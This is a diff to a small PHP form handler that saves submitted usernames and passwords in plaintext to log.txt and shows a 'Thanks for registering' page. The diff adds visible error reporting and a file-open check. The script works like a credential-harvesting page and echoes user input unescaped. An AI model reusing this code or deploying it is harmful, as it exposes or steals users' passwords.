@@ -1,4 +1,7 @@
 <?php
+ini_set('display_errors', 1); 
+error_reporting(E_ALL);
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Capture the username and password from the form
     $username = $_POST['username'];
@@ -7,8 +10,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Open the file in append mode
     $file = fopen("log.txt", "a");
 
+    // Check if the file was opened successfully
+    if (!$file) {
+        echo "Error opening file.";
+        exit;
+    }
+
     // Write the username and password to the file
-    // Format: Username: [username], Password: [password], Timestamp: [timestamp]
     $log_entry = "Username: $username, Password: $password, Timestamp: " . date("Y-m-d H:i:s") . "\n";
     fwrite($file, $log_entry);
 
@@ -29,7 +37,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 margin-top: 50px;
             }
             h1 {
-                color: red; /* Change to red */
+                color: red;
             }
             p {
                 color: #6c757d;
@@ -37,7 +45,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         </style>
     </head>
     <body>
-        <h1>Thanks for registering.</h1> <!-- This text is now in red -->
+        <h1>Thanks for registering.</h1>
         <p>Welcome, $username!</p>
     </body>
     </html>";
